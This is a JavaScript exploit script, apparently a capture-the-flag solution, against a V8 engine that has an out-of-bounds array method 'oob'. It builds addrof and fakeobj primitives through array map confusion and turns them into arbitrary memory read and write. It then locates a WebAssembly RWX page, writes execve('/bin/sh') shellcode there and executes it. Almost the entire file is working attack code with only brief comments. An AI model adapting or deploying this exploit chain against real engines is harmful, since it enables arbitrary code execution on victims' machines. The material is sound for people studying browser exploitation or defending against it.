// Useful type conversion function
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Creat a object array and a float array

var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];

// shift right 4 bytes element buf to get object map
f64_buf[0] = obj_arr.oob();
u64_buf[1] = u64_buf[1] - 4;
obj_arr.oob(f64_buf[0]);
// oob to get object map
f64_buf[0] = obj_arr.oob();
var obj_map = u64_buf[0];

// oob to get float map
f64_buf[0] = float_arr.oob();
var float_map = u64_buf[0];

console.log("Obj_map 0x"+obj_map.toString(16));
console.log("Float_map 0x"+float_map.toString(16));

function addrof(in_obj) {
    //save original map
    var org = obj_arr.oob();
    
    //modify map to float_map
    f64_buf[0] = org;
    u64_buf[0] = float_map;
   
    //assign object to index 0	
    obj_arr[0] = in_obj;

    //change object array to float array
    obj_arr.oob(f64_buf[0]);

    //leak that object address
    let addr = obj_arr[0]; 
    
    // set it back
    obj_arr.oob(org);

    //return BigInt address
    f64_buf[0] = addr;
    return u64_buf[0];
}



function fakeobj(addr) {
    
    //assign address to float array at index 0 
    u64_buf[0] = addr;
    float_arr[0] = f64_buf[0];


    //save original map
    var org = float_arr.oob();

    //modify map to object_map
    f64_buf[0] = org;
    u64_buf[0] = obj_map;

    //change float array to object array 
    float_arr.oob(f64_buf[0]);

    // get object 
    let fake = float_arr[0];

    // set it back
    float_arr.oob(org);

    // Return the object
    return fake;
}

// change element buf to the address we want to leak
function limit_read(addr){
	// | elements' buf | length | => both are 4 bytes
	// The first element is at offset 8 of the buf
	// Calculate the val we want to set  
	var val =  0x1000000000n - 8n + BigInt(addr);
	
	// identify as a pointer
	val = val+1n;

	// create a float array layout
	// | map | ???  | elements' buf | length | => (slice(0) make heap layout stable)
	var fake_obj_layout = [itof(BigInt(float_map)),itof(val)].slice(0);
	
	// Get fake flat array's element to leak address
	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
	return fake_obj[0];
}

function limit_write(addr,v){
	// | elements' buf | length | => both are 4 bytes
	// The first element is at offset 8 of the buf
	// Calculate the val we want to set  
	var val =  0x1000000000n - 8n + BigInt(addr);
	
	// identify as a pointer
	val = val+1n;

	// create a float array layout
	// | map | ???  | elements' buf | length | => (slice(0) make heap layout stable)
	var fake_obj_layout = [itof(BigInt(float_map)),itof(val)].slice(0);
	
	// Get fake flat array's element and set value back
	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
	fake_obj[0] = v;
}

// Creat another ArrayBuffer in order to get arbitrary read/write
var AB_buf = new ArrayBuffer(8); 

// Read/Write by float 
var AB_f64_buf = new Float64Array(AB_buf);

// Get the address AB_buf's heap stored
// Subtract one because it is a pointer
var heap_buf_offset = addrof(AB_f64_buf)+0x28-1;


function ab_read(addr){
	// set heap buf to addr
	limit_write(heap_buf_offset,addr);

	// read that addr
	return AB_f64_buf[0];
}
function ab_write(addr,val){

	// set heap buf to addr
	limit_write(heap_buf_offset,addr);
	
	// write val to addr
	AB_f64_buf[0]=val;
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

// Get rwx page address
var rwx = limit_read(addrof(wasm_instance)+0x68-1);

// execve("/bin/sh",0,0) shellcode
var shellcode = [
	0x6e69622fb848686an,
	0xe7894850732f2f2fn,
	0x2434810101697268n,
	0x6a56f63101010101n,
	0x894856e601485e08n,
	0x50f583b6ad231e6n,
	0xccccccccccccccccn,
]

// Write shellcode to the rwx page
for(let i=0;i<shellcode.length;i++){
	ab_write(rwx,itof(shellcode[i]));
	rwx = itof(ftoi(rwx)+8n);
}

// execute shellcode
f();

